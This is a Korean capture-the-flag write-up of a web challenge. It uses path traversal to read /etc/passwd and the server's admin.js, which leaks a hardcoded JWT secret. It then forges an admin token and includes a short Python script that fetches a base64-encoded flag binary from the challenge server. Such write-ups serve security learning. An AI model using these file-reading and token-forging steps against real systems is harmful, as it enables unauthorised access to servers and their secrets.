# 키워드
- Path Traversal

# 풀이과정
- n0paew님 풀이
- 문제 파일에 있는 image 폴더에서 이미지 명을 확인하고 request를 보내보면, 다음과 같이 이미지가 출력되게 됨
![[Pasted image 20231230041632.png]]

- 이미지 대신 상대경로를 이용해 서버 파일을 유출시킬 수 있음
- 이때 들어오는 파일은 base64로 인코딩 되어있어서 디코딩하면 `/etc/passwd`을 얻을 수 있음
- 따라서 `Path Traversal` 취약점이 있음을 알 수 있음
![[Pasted image 20231230041857.png]]

- 우선 jwt token key를 확인하기 위해 ../routes/admin.js 를 요청해보면, admin.js 파일을 얻을 수 있음
```js
const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const fs = require('fs');
const path = require('path');

const key = "Hi,im_yeonwookim!"

router.get('/', (req, res) => {
  try {
    const token = req.query.t; 
    const decoded = jwt.verify(token,key);
    if (decoded.id === 'admin') {

      res.set('Cache-Control', 'no-store');
      const flagPath = path.join(__dirname, '../../../../../../../../flag');

      fs.readFile(flagPath, (err, data) => {
        if (err) {
          res.status(500).json({ error: 'Internal Server Error. Report to yeonwoo plz.' });
        } else {
          const encodedData = Buffer.from(data).toString('base64');

          res.json({ flag: "Great!!", res: encodedData });
        }
      });
    } else {
      res.status(403).json({ error: 'Permission denied' });
    }
  } catch (error) {
    res.status(403).json({error: 'Permission denied'});
  }
});

module.exports = router;
```

- [토큰 생성 사이트](https://jwt.io/)
- 해당 key(Hi,im_yeonwookim!)를 통해 id가 admin인 jwt token을 생성할 수 있음
![[Pasted image 20231230042224.png]]

- 해당 jwt token을 admin page에 넣게 되면 flag: Great!!과 res: Great!!문구를 볼 수 있고, 이를 웹프록시 툴로 분석해보면 elf파일임을 알 수 있음
```python
import requests
import base64
url = "http://13.230.131.70:9000/admin?t=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImFkbWluIiwiaWF0IjoxNzAzMjQyOTM4fQ.pHHw12_CoelGoyl1P2ORCgzPzb44gzk6s1S3-ncxbf8"

res = requests.get(url)
json_elf = res.json()
with open('./decodeelf','wb') as file:
	file.write(base64.b64decode(json_elf['res']))
```
![[Pasted image 20231230042511.png]]

- 위 바이너리를 linux에서 실행하면 flag를 얻을 수 있음
![[Pasted image 20231230042535.png]]

